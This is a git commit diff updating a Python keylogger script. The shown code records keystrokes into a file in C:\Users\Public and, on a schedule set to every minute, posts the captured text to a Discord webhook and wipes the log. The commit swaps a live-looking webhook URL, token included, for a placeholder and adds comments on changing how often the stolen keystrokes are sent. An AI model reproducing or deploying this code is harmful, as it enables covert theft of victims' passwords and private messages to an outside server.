f79af1273854b744bd6d4bebfc8e3d6bb4f8fc89
Chrislundh98 <christoffer.lundh98@gmail.com>
2024-03-09 12:04:38 +0100

    Update keylogger.py

--- Keylogger/keylogger.py
+++ Keylogger/keylogger.py
@@ -10,7 +10,7 @@ file_log = os.path.join("C:\\Users\\Public", "key_logs.txt")
 def send_to_discord(file_log):
     with open(file_log, 'r') as file:
         data = file.read()
-    webhook_url = 'https://discord.com/api/webhooks/1214534715692810251/FWN6gpaygdh6o4M8hg975ViHpYs-aOuNviGzWQkc_kJPxLCUV3_4MTRZWwuGBCjFWFMb'
+    webhook_url = 'https://YOUR_WEBHOOK_URL_HERE.com/' #
     response = requests.post(webhook_url, data=json.dumps({"content": data}), headers={"Content-Type": "application/json"})
     print(response.status_code)
     open(file_log, 'w').close()
@@ -23,7 +23,7 @@ def keyPressed(key):
         with open(file_log, 'r+') as logKey:
             content = logKey.read()
             logKey.seek(0)
-            logKey.write(content[:-1]) #removes index with 1
+            logKey.write(content[:-1]) 
             logKey.truncate()
     else: 
         # spacebar functionality
@@ -36,9 +36,10 @@ def keyPressed(key):
                     logKey.write(char) 
             except AttributeError:
                 print("Error getting char")
-#schedule.every().hour.do(send_to_discord, file_log=file_log)
-                
-schedule.every().minute.do(send_to_discord, file_log=file_log)
+# Time schedule for when the content of key_logs.txt should be sent through discord, you can modify it how you wish
+#schedule.every().hour.do(send_to_discord, file_log=file_log) # hourly               
+schedule.every().minute.do(send_to_discord, file_log=file_log) #currently gets the input every minute
+
 # runs the script
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
